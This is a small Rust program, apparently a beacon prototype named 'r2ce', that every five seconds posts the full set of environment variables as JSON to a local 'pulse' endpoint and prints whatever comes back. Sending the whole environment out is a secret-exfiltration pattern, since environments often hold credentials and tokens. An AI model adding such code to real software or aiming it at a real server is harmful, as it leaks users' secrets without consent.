use std::{collections::HashMap, env, str};
use tokio::time;

const PULSE_URL: &str = "http://localhost:6022/pulse";

#[tokio::main]
async fn main() {
    println!("init r2ce");

    let mut interval = time::interval(time::Duration::from_secs(5));

    loop {
        send_pulse_async().await;
        interval.tick().await;
    }
}

async fn send_pulse_async() {
    let payload_env: HashMap<String, String> = env::vars().collect();
    let pulse_client: reqwest::Client = reqwest::Client::new();
    let response = pulse_client
        .post(PULSE_URL)
        .json(&payload_env)
        .send()
        .await
        .unwrap();

    println!("pulse sent: {}", response.status().as_str());

    if response.status().as_u16() == 204 {
        return;
    }

    let data = response.text().await.unwrap();
    println!("pulse got: {}", data);
}
